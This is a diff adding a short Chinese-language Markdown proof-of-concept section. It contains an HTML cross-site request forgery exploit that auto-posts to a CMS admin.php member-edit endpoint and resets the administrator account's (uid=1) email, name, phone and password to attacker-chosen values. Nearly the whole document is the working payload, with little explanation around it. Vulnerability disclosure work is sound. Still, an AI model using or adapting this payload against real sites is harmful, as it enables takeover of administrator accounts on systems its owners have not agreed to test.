@@ -1,0 +1,19 @@
+## POC实现代码如下：  
+
+> exp代码如下：  
+
+``` html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://127.0.0.1/admin.php?c=member&m=edit&uid=1" method="POST">
+      <input type="hidden" name="page" value="0" />
+      <input type="hidden" name="member&#91;email&#93;" value="admin&#64;163&#46;com" />
+      <input type="hidden" name="member&#91;name&#93;" value="admin" />
+      <input type="hidden" name="member&#91;phone&#93;" value="18888888888" />
+      <input type="hidden" name="member&#91;password&#93;" value="888888" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
